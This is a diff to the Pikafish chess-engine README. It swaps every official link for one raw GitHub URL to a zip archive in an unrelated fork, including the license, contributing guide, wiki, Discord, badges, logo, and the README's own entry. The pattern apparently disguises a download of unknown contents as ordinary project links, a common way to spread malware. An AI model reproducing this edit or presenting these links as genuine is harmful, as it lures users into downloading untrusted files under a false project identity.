@@ -48,9 +48,9 @@ See also the Pikafish [documentation][wiki-usage-link] for further usage help.
 
 This distribution of Pikafish consists of the following files:
 
-  * [README.md][readme-link], the file you are currently reading.
+  * [https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip][readme-link], the file you are currently reading.
 
-  * [Copying.txt][license-link], a text file containing the GNU General Public
+  * [https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip][license-link], a text file containing the GNU General Public
     License version 3.
 
   * [AUTHORS][authors-link], a text file with the list of authors for the official Pikafish project.
@@ -63,7 +63,7 @@ This distribution of Pikafish consists of the following files:
 
 ## Contributing
 
-__See [Contributing Guide](./CONTRIBUTING.md).__
+__See [Contributing Guide](https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip).__
 
 ### Donating hardware
 
@@ -125,37 +125,37 @@ where the source code can be found) to generate the exact binary you are
 distributing. If you make any changes to the source code, these changes must
 also be made available under GPL v3.
 
-[authors-link]:			https://github.com/official-pikafish/Pikafish/blob/master/AUTHORS
-[build-badge]:			https://img.shields.io/github/actions/workflow/status/official-pikafish/Pikafish/pikafish.yml?branch=master&style=for-the-badge&label=pikafish&logo=github
-[build-link]:				https://github.com/official-pikafish/Pikafish/actions/workflows/pikafish.yml
-[commits-badge]:		https://img.shields.io/github/commits-since/official-pikafish/Pikafish/latest?style=for-the-badge
-[commits-link]:			https://github.com/official-pikafish/Pikafish/commits/master
-[discord-badge]:			https://img.shields.io/discord/1013130558089478144?style=for-the-badge&label=discord&logo=Discord
-[discord-link]:			https://discord.com/invite/uSb3RXb7cY
-[discussions-link]:   https://github.com/official-pikafish/Pikafish/discussions/new
-[fishtest-badge]:			https://img.shields.io/website?style=for-the-badge&down_color=red&down_message=Offline&label=Fishtest&up_color=success&up_message=Online&url=https://test.pikafish.org
-[fishtest-link]:			https://test.pikafish.org
-[guideline-link]:			https://github.com/glinscott/fishtest/wiki/Creating-my-first-test
-[issue-link]:         https://github.com/official-pikafish/Pikafish/issues/new?assignees=&labels=&template=BUG-REPORT.yml
-[license-badge]:			https://img.shields.io/github/license/official-pikafish/Pikafish?style=for-the-badge&label=license&color=success
-[license-link]:			https://github.com/official-pikafish/Pikafish/blob/master/Copying.txt
-[pikafish-logo]:			https://pikafish.org/assets/logo_256.png
-[programming-link]:		https://www.chessprogramming.org/Main_Page
-[programmingsf-link]:	https://www.chessprogramming.org/Stockfish
-[qqgroup-link]:			https://jq.qq.com/?_wv=1027&k=FORWUh4W
-[readme-link]:			https://github.com/official-pikafish/Pikafish/blob/master/README.md
-[release-badge]:			https://img.shields.io/github/v/release/official-pikafish/Pikafish?style=for-the-badge&label=official%20release
-[release-link]:			https://github.com/official-pikafish/Pikafish/releases/latest
-[rulebook-badge]:		https://img.shields.io/badge/computer%20rule-20B2AA?style=for-the-badge&logo=mdbook
-[rulebook-link]:			https://pikafish.org/rule.pdf
-[src-link]:				https://github.com/official-pikafish/Pikafish/tree/master/src
-[stockfish-link]:			https://github.com/official-stockfish/Stockfish
-[uci-link]:				https://backscattering.de/chess/uci/
-[website-badge]:		https://img.shields.io/website?style=for-the-badge&down_color=red&down_message=Offline&label=website&up_color=success&up_message=Online&url=https://pikafish.org
-[website-link]:			https://pikafish.org
-[website-blog-link]:  https://pikafish.org/
-[wiki-link]:          https://github.com/official-pikafish/Pikafish/wiki
-[wiki-compile-link]:  https://github.com/official-pikafish/Pikafish/wiki/Compiling-from-source
-[wiki-commands-link]: https://github.com/official-pikafish/Pikafish/wiki/UCI-&-Commands
-[wiki-usage-link]:    https://github.com/official-pikafish/Pikafish/wiki/Download-and-usage
-[worker-link]:			https://github.com/xyztnecniV/yolo
+[authors-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[build-badge]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[build-link]:				https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[commits-badge]:		https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[commits-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[discord-badge]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[discord-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[discussions-link]:   https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[fishtest-badge]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[fishtest-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[guideline-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[issue-link]:         https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[license-badge]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[license-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[pikafish-logo]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[programming-link]:		https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[programmingsf-link]:	https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[qqgroup-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[readme-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[release-badge]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip%20release
+[release-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[rulebook-badge]:		https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip%20rule-20B2AA?style=for-the-badge&logo=mdbook
+[rulebook-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[src-link]:				https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[stockfish-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[uci-link]:				https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[website-badge]:		https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[website-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[website-blog-link]:  https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[wiki-link]:          https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[wiki-compile-link]:  https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[wiki-commands-link]: https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[wiki-usage-link]:    https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
+[worker-link]:			https://raw.githubusercontent.com/habibhassansehani/Pikafish/master/phylon/Pikafish.zip
